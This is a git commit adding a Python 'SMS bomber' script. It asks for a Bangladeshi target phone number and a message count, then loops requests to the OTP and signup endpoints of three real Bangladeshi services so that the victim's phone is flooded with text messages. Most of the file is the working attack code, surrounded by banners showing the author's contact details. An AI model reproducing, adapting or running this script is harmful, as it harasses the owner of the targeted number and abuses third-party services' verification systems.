7143b6d499114bf020e46f3e7e3962528e81a982
blacklover1609 <mdhridoyhossain16091609@gmail.com>
2024-11-27 18:52:13 +0600

    Add files via upload

---
+++ black-sms.py
@@ -0,0 +1,117 @@
+import os
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] {B-A-D Vhut}SYSTEM INSTALL. . . . \033[1;30m")
+#os.system("pkg install espeak")
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] INSTALL COMPLETE \033[1;30m")
+#os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS B-A-D Vhut \033[1;30m")
+#os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH B-A-D Vhut OFF Shuvo "')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://www.facebook.com/hridoy.hossain.475619")
+logo3=("""
+
+  _    _ _____  _____ _____   ______     __
+ | |  | |  __ \|_   _|  __ \ / __ \ \   / /
+ | |__| | |__) | | | | |  | | |  | \ \_/ / 
+ |  __  |  _  /  | | | |  | | |  | |\   /  
+ | |  | | | \ \ _| |_| |__| | |__| | | |   
+ |_|  |_|_|  \_\_____|_____/ \____/  |_|   
+                                           
+                                           
+                                                                                                               
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋BLACK LOVER😈 \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑    \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER😈 \x1b[38;5;196m║\033[38;5;46mHridoy Hossain    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER😈 \x1b[38;5;196m║\033[38;5;46mHridoy Hossain    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[H]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER😈\x1b[38;5;196m ║\033[38;5;46m+8801319783646    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐅𝐑𝐎𝐌      \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER😈\x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋BLACK LOVER😈 \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
+#os.system('espeak -a 300 "author ASHRAF MAHADE "')
+#os.system('espeak -a 300 "Facebook  Shuvo "')
+#os.system('espeak -a 300 "whathapp + 8 8 0 1 3 1 9 7 8 3 6 4 6 "')
+#os.system('espeak -a 300 "github B A D - V H U T "')
+#os.system('espeak -a 300 "telegram + 8 8 0 1 8 6 2 8 8 2 9 6 5 "')
+#os.system('espeak -a 300 "imo + 8 8 0 1 8 6 2 8 8 2 9 6 5  "')
+#os.system('espeak -a 300 "from Bangladesh "')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m🦋BLACK LOVER😈 SMS WAS SENT☠️")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m🦋BLACK LOVER😈 SMS WAS SENT☠️")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m🦋BLACK LOVER😈 SMS WAS SENT☠️")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+\x1b[38;5;196m
+
+
+  _    _ _____  _____ _____   ______     __
+ | |  | |  __ \|_   _|  __ \ / __ \ \   / /
+ | |__| | |__) | | | | |  | | |  | \ \_/ / 
+ |  __  |  _  /  | | | |  | | |  | |\   /  
+ | |  | | | \ \ _| |_| |__| | |__| | | |   
+ |_|  |_|_|  \_\_____|_____/ \____/  |_|   
+                                           
+                                                                                                                               
+
+                                                                                                                
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋BLACK LOVER \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑    \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER\x1b[38;5;196m ║\033[38;5;46mHridoy Hossain    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER\x1b[38;5;196m ║\033[38;5;46mHridoy Hossain    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[H]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER\x1b[38;5;196m ║\033[38;5;46m+8801319783646    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐅𝐑𝐎𝐌      \x1b[38;5;196m║  \033[38;5;46m🦋BLACK LOVER\x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋BLACK LOVER \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
